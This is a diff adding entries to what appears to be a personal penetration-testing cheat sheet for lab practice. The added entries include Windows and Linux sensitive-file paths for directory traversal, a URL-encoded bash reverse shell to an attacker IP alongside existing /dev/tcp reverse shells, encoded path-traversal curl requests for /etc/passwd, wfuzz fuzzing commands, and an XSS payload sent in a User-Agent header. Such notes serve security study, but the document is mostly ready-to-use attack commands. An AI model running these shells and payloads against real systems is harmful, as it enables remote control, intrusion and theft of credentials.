@@ -79,6 +79,10 @@
 ## Important Files
 - Windows
 ```bash
+C:\Windows\System32\drivers\etc\hosts
+C:\inetpub\logs\LogFiles\W3SVC1\
+C:\inetpub\wwwroot\web.config
+C:\xampp\apache\logs\
 C:/Users/Administrator/NTUser.dat
 C:/xampp/phpMyAdmin/config.inc.php
 C:\ProgramData\McAfee\Agent\DB\ma.db
@@ -88,6 +92,7 @@ C:\ProgramData\McAfee\Agent\DB\ma.db
 ```bash
 /opt/*
 /var/mail
+/var/log/apache2/access.log
 /config/.htusers.php
 /proc/self/environ
 /proc/self/cmdline
@@ -110,7 +115,9 @@ applicationName.cfg
 # bash reverse shell
 bash -i >& /dev/tcp/192.168.45.x/80 0>&1
 bash -c 'bash -i >& /dev/tcp/192.168.45.x/80 0>&1'
+bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
 echo -n '/bin/bash -c "bin/bash -i >& /dev/tcp/192.168.45.176/80 0>&1"' | base64
+
 
 
 # python reverse shell
@@ -451,8 +458,15 @@ nikto -h http://ip_address -o report.html
 
 ### wfuzz
 ```bash
+# Directory traversal&&API FUZZING
+wfuzz -c --sc 200,301 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt http://192.168.234.16/FUZZ
+wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt http://192.168.234.16:5002/FUZZ/v1
+wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt http://192.168.234.16:5002/FUZZ/v2
+
 # Fuzz for any files we can find
 wfuzz -c --sc 200,301 -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -H 'X-Forwarded-For:127.0.0.1' http://192.168.222.134:13337/logs?file=FUZZ
+
+wfuzz -w /home/kali/repos/projects/SecLists/Discovery/DNS/subdomains-top1million-110000.txt http://192.168.238.150:8080/search?FUZZ=FUZZ
 
 # Fuzz for any files in our current directory
 wfuzz -c --sc 200,301 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -H 'X-Forwarded-For:127.0.0.1' http://192.168.222.134:13337/logs?file=./FUZZ.py
@@ -473,8 +487,10 @@ curl -v target:port
 
 # directory traversal
 curl --path-as-is http://192.168.x.x/../../../../../../etc/passwd
+curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 
 # GET Request
+## when you get 405 method not allowed, try something else other than GET such as POST or PUT etc.
 curl -i http://192.168.50.16:5002/users/v1/admin/password
 
 # POST Request
@@ -483,6 +499,9 @@ curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/j
 
 # PUT Request
 curl -X 'PUT' 'http://192.168.50.16:5002/users/v1/admin/password' -H 'Content-Type: application/json' -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' -d '{"password": "pwned"}'
+
+# User-agent
+curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(...))</script>" --proxy 127.0.0.1:8080
 ```
 
 ### wget
@@ -986,6 +1005,11 @@ smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhac
 
 
 # SSH
+## SSH connect
+```bash
+# ssh with private key
+ssh -i id_rsa -p 2222 root@192.168.x.x 
+```
 ## SSH Key
 - See if other users can login as root using ssh key
 
@@ -1022,6 +1046,7 @@ ssh -N -R 9998 kali@192.168.118.4
 
 # Web Attacks
 ## Checklist
+- sudo nmap -p80 --script=http-enum 192.168.x.x
 - Gobuster
 - Feroxbuster
   - phpinfo.php --> check "DOCUMENT_ROOT"
@@ -1090,9 +1115,16 @@ curl -d '{"user":"clumsyadmin","url":"http://192.168.45.175:443/updatefile.elf;n
   - Intercept the request with Burp Suite
 
 ## Directory Traversal
+- Check DT vulnerability On windows:
+  - C:\Windows\System32\drivers\etc\hosts
+  - C:\inetpub\logs\LogFiles\W3SVC1\
+  - C:\inetpub\wwwroot\web.config
+- On Linux:
+  - /etc/passwd
+  - curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+  - Check .ssh directory
 - Make sure to read and try exploit codes' examples
 - Use curl --path-as-is or burp suite
-- Check .ssh directory
 - Check if we can read other vulnerable app's config file through this vulnerability
 - Check other user's home directories to see the name of the files(pg practice cassandra)
 - If wget doesn't work, maybe it only requires very simple way to get through: such as pivot as other users)
